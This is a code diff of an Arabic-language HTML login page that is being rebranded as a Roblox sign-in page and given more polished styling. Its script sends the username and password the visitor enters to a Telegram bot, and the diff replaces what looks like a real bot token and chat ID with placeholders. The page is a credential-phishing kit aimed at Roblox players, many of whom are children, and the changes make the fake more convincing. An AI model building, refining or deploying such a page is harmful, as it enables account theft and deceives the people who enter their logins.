@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة تسجيل الدخول</title>
+    <title>Roblox - صفحة تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #a9a9a9; /* Professional gray background */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,35 +16,48 @@
         }
         .login-container {
             background-color: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
             text-align: center;
+            width: 300px; /* Fixed width for consistency */
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
         }
         input {
             display: block;
-            width: 100%;
+            width: calc(100% - 20px); /* Adjusted for padding */
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 3px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
         }
         button {
             background-color: #4CAF50;
             color: white;
-            padding: 10px 15px;
+            padding: 10px;
             border: none;
-            border-radius: 3px;
+            border-radius: 4px;
             cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
         }
         button:hover {
             background-color: #45a049;
+        }
+        #result {
+            margin-top: 15px;
+            color: #f00; /* Red color for error messages */
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <h1>تسجيل الدخول</h1>
+        <h1>تسجيل الدخول إلى Roblox</h1>
         <form id="loginForm">
             <input type="text" id="username" placeholder="اسم المستخدم" required>
             <input type="password" id="password" placeholder="كلمة المرور" required>
@@ -54,8 +67,8 @@
     </div>
     
     <script>
-        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // توكن البوت الخاص بك
-        const CHAT_ID = '7072093078'; // معرف الدردشة الخاص بك
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // توكن البوت الخاص بك
+        const CHAT_ID = 'YOUR_CHAT_ID'; // معرف الدردشة الخاص بك
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -79,6 +92,7 @@
             .then(response => response.json())
             .then(data => {
                 result.textContent = "تم إرسال البيانات! شكراً لتسجيل الدخول.";
+                result.style.color = "#4CAF50"; // Green color for success messages
             })
             .catch((error) => {
                 console.error('Error:', error);
